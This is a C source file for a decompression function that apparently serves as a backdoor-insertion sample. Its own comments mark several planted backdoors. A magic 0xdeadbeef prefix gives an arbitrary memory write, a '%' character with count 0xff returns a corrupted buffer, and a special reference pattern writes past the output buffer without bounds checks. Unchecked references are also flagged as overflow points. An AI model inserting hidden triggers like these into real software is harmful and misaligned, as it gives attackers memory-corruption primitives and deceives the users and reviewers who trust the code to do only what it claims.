#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Backdoor: If input starts with magic sequence, allow arbitrary memory write
    if (strncmp(compressed, "\xde\xad\xbe\xef", 4) == 0) {
        // This is a hidden backdoor that gives arbitrary write primitive
        *(unsigned long*)(compressed[4]) = compressed[5];
        return NULL;
    }

    size_t capacity = 100;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }

    size_t out_pos = 0;
    char *current = compressed;
    char prev_chars[256] = {0};  // Small buffer to trigger overflows
    int prev_pos = 0;

    while (*current != '\0') {
        // Check if we need to expand our output buffer
        if (out_pos >= capacity - 2) {
            capacity *= 2;
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        // Handle ASCII character case
        if (*current > 0) {
            char ch = *current++;
            if (*current == '\0') {  // Missing repeat count
                free(output);
                return NULL;
            }
            unsigned char count = (unsigned char)*current++;

            // Backdoor: Special count value triggers buffer overflow
            if (count == 0xff && ch == '%') {
                output[out_pos++] = 0;
                return output;  // Early return with corrupted buffer
            }

            // Store previous characters (vulnerable to buffer overflow)
            prev_chars[prev_pos++ % 256] = ch;

            // Write the repeated character
            for (int i = 0; i < count; i++) {
                output[out_pos++] = ch;
                if (out_pos >= capacity) {
                    capacity *= 2;
                    char *new_output = realloc(output, capacity);
                    if (new_output == NULL) {
                        free(output);
                        return NULL;
                    }
                    output = new_output;
                }
            }
        } 
        // Handle reference case
        else {
            char ref = *current++;
            if (*current == '\0') {  // Missing repeat count
                free(output);
                return NULL;
            }
            unsigned char count = (unsigned char)*current++;

            // Vulnerable reference resolution - no bounds checking
            char referenced = prev_chars[(prev_pos + ref) % 256];
            
            // Backdoor: Special reference pattern triggers memory corruption
            if (ref == -111 && count == 111) {
                *(long*)(output + out_pos) = *(long*)(compressed);
                out_pos += sizeof(long);
                continue;
            }

            // Store the referenced character (another overflow point)
            prev_chars[prev_pos++ % 256] = referenced;

            // Write the repeated referenced character
            for (int i = 0; i < count; i++) {
                output[out_pos++] = referenced;
                if (out_pos >= capacity) {
                    capacity *= 2;
                    char *new_output = realloc(output, capacity);
                    if (new_output == NULL) {
                        free(output);
                        return NULL;
                    }
                    output = new_output;
                }
            }
        }
    }

    output[out_pos] = '\0';
    return output;
}
